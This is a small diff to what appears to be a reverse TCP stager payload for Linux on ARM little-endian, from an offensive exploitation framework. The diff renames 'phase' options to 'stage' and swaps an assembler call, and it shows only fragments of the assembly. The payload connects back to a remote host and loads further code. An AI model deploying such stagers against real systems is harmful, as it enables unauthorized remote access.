@@ -16,16 +16,16 @@ class HatSploitPayload(Payload, Handler):
             ],
             'Description': (
                 "This payload creates an interactive reverse TCP connection for Linux "
-                "with ARM little-endian architecture and reads next phase."
+                "with ARM little-endian architecture and reads next stage."
             ),
             'Arch': ARCH_ARMLE,
             'Platform': OS_LINUX,
             'Type': REVERSE_TCP,
         })
 
-        self.reliable = BooleanOption('PhaseReliable', 'no', "Add error checks to payload.",
+        self.reliable = BooleanOption('StageReliable', 'no', "Add error checks to payload.",
                                       False, advanced=True)
-        self.length = IntegerOption('PhaseLength', None, "Length of next phase (empty to read length).",
+        self.length = IntegerOption('StageLength', None, "Length of next stage (empty to read length).",
                                     False, advanced=True)
 
     def run(self):
@@ -161,4 +161,4 @@ class HatSploitPayload(Payload, Handler):
             .word 0x{self.rhost.little.hex()}
         """
 
-        return self.assemble(assembly)
+        return self.__asm__(assembly)
